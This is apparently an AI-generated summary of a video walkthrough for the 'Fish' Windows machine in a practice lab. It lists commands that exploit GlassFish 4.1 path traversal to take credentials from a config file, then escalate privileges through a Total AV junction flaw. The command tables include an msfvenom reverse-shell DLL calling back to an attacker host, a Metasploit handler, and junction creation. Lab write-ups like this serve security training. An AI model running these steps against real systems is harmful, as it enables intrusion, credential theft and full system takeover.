The video provides a walkthrough for compromising a Windows machine named **Fish** on the PG Practice environment, primarily focusing on exploiting an outdated GlassFish service and an antivirus vulnerability.

Here are the comprehensive notes and all commands used, with Nmap commands excluded as requested.

***

## 📝 Comprehensive Notes

### Initial Enumeration Findings (Excluding Nmap)

* **Target OS:** Windows 10.
* **Web Services Identified:**
    * **Port 4848:** **Sun GlassFish Open Source Edition 4.1** (Admin login page).
    * **Port 6060:** **Cineman 4.0** (Login page).
    * **Port 8080/8181:** Default website templates.
* **Default Credentials:** GlassFish default credentials (**admin** / **no password**) were checked but found to be changed/configured.
* **Vulnerability (GlassFish):** An unauthenticated **Path Traversal** vulnerability was discovered in GlassFish 4.1.

### Credentials Found (Low-Privilege Foothold)

* By exploiting the GlassFish Path Traversal to exfiltrate the **`senaman/config/appconfig.xml`** file, the following credentials were found:
    * **Username:** `arthur`
    * **Password:** `KingOfAtlantis` (Capital K, O, A)
* The `arthur` user was confirmed to be a member of the **Remote Desktop Users** group, allowing for a remote login.

### Privilege Escalation Findings (Root/System)

* **Local Enumeration:** Running processes revealed a third-party antivirus: **Total AV**.
* **Vulnerability (Total AV):** Total AV version **4.13.31** was found to be vulnerable to a **Privilege Escalation** exploit (Exploit-DB ID: 48310) utilizing an **NTFS Directory Junction** (symbolic link) during the **Quarantine/Restore** process.
* **Mechanism:** The attack involves creating a malicious DLL, tricking the antivirus (running as `NT AUTHORITY\SYSTEM`) into quarantining it, creating a junction point from the DLL's original location (`C:\mount`) to a System-privileged directory (e.g., `C:\Windows\Microsoft.NET\Framework\v4.0.30319`), and then restoring the file. Upon a restart, a System process loads the restored malicious DLL, granting a reverse shell with **NT AUTHORITY\SYSTEM** privileges.

***

## 💻 Commands Used

### 1. Initial Access & Path Traversal Exploitation

| Phase | Command | Purpose |
| :--- | :--- | :--- |
| **RDP Check** | **`rdesktop <TARGET_IP>`** | Connect via RDP to verify the OS (used again later for login). |
| **File Fuzzing** | **`export url=http://<TARGET_IP>:4848/fuzz`** | Set environment variable for fuzzing URL. |
| **Directory Fuzzing** | **`wfuzz -c -z file,/opt/offsec/wordlists/discovery/web_content/raft-medium-directories.txt --hc 404,4772 $url/`** | Directory brute-forcing on port 4848, suppressing common response codes. |
| **Vulnerability Search** | **`searchsploit sun glass fish`** | Search the Exploit-DB for known vulnerabilities. |
| **Metasploit Setup** | **`msfconsole`** | Start the Metasploit Framework. |
| **Metasploit Module** | **`use exploit/windows/http/glassfish_file_access`** | Load the Path Traversal module. |
| **Module Settings** | **`set RHOSTS <TARGET_IP>`** | Set the target IP address. |
| **Module Settings** | **`set RPORT 4848`** | Set the target port. |
| **Initial Test** | **`set FILE_PATH windows\win.ini`** | Test the traversal by pulling a known Windows file. |
| **Run Exploit** | **`run`** | Execute the exploit module. |
| **File Exfiltration** | **`set FILE_PATH senaman/config/appconfig.xml`** | Target the configuration file containing credentials. |
| **Run Exploit** | **`run`** | Execute to exfiltrate the file. |
| **Credential Analysis (Example)** | **`cat <loot_file> | grep -Rin pass --color=auto`** | Search the exfiltrated file for the password. |

### 2. Low-Privilege Foothold & Local Enumeration

| Phase | Command | Purpose |
| :--- | :--- | :--- |
| **RDP Login** | **`rdesktop <TARGET_IP>`** | Log in as **arthur** / **KingOfAtlantis**. |
| **Check Privileges (CMD)** | **`whoami /priv`** | Check the current user's security privileges. |
| **Check Users (CMD)** | **`net users`** | List all user accounts on the system. |
| **Check WMI (CMD)** | **`wmic`** | Confirm Windows Management Instrumentation is available. |
| **Check Processes (CMD)** | **`tasklist /v`** | List running processes to identify security software (found Total AV). |

### 3. Privilege Escalation (Total AV)

| Phase | Command | Purpose |
| :--- | :--- | :--- |
| **Apache Start** | **`service apache2 start`** | Start a web server for file transfer. |
| **DLL Generation** | **`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f dll -o version.dll`** | Create the malicious DLL payload. |
| **Directory Creation (Windows CMD)** | **`mkdir C:\mount`** | Create the directory that will be used as the junction point. |
| **Move DLL (Windows CMD)** | **`move C:\Users\arthur\Downloads\version.dll C:\mount\version.dll`** | Move the downloaded DLL to the mount directory. |
| **Junction Creation (PowerShell)** | **`.\createmountpoint.exe C:\mount C:\Windows\Microsoft.NET\Framework\v4.0.30319`** | Create the symbolic link from `C:\mount` to the privileged directory. |
| **Metasploit Handler** | **`use exploit/multi/handler`** | Set up the listener for the reverse shell. |
| **Handler Payload** | **`set PAYLOAD windows/meterpreter/reverse_tcp`** | Set the matching payload. |
| **Handler Settings** | **`set LHOST <ATTACKER_IP>`** | Set the attacking machine's IP. |
| **Handler Settings** | **`set LPORT 443`** | Set the listening port. |
| **Start Listener** | **`run`** | Start the handler, waiting for the connection. |
| **Final Check (Post-Exploitation)** | **`shell`** | Drop into an interactive shell. |
| **Final Check** | **`whoami`** | Verify successful escalation to **`nt authority\system`**. |
| **Final Check** | **`ipconfig`** | Get network configuration details. |
| **Final Check** | **`type C:\Users\Administrator\Desktop\proof.txt`** | Retrieve the final proof file. |
http://googleusercontent.com/youtube_content/0